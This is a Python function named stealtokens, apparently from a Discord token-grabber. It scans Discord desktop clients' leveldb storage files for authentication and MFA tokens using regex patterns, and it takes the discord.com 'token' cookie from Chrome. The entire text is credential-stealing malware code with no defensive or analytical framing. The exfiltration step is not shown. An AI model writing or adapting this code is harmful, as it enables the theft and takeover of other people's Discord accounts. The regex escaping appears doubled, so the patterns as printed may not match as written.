def stealtokens():
    tokens = []
    
    discord_paths = [
        os.path.join(os.environ['APPDATA'], 'discord'),
        os.path.join(os.environ['LOCALAPPDATA'], 'Discord'),
        os.path.join(os.environ['APPDATA'], 'discordcanary'),
        os.path.join(os.environ['APPDATA'], 'discordptb')
    ]
    
    for discord_path in discord_paths:
        if os.path.exists(discord_path):
            for root, dirs, files in os.walk(discord_path):
                if 'Local Storage' in root and 'leveldb' in root:
                    for file in files:
                        if file.endswith(('.ldb', '.log')):
                            try:
                                with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                
                                token_patterns = [
                                    r'[\\w-]{24}\\\\.[\\w-]{6}\\\\.[\\w-]{27}',
                                    r'mfa\\\\.[\\w-]{84}'
                                ]
                                
                                for pattern in token_patterns:
                                    found_tokens = re.findall(pattern, content)
                                    for token in found_tokens:
                                        tokens.append({
                                            'source': 'Desktop',
                                            'client': os.path.basename(discord_path),
                                            'token': token
                                        })
                            except:
                                continue
    
    try:
        chrome_cookies = browser_cookie3.chrome(domain_name='discord.com')
        for cookie in chrome_cookies:
            if cookie.name.lower() == 'token':
                tokens.append({
                    'source': 'Chrome Cookies',
                    'token': cookie.value
                })
    except:
        pass
    
    return tokens
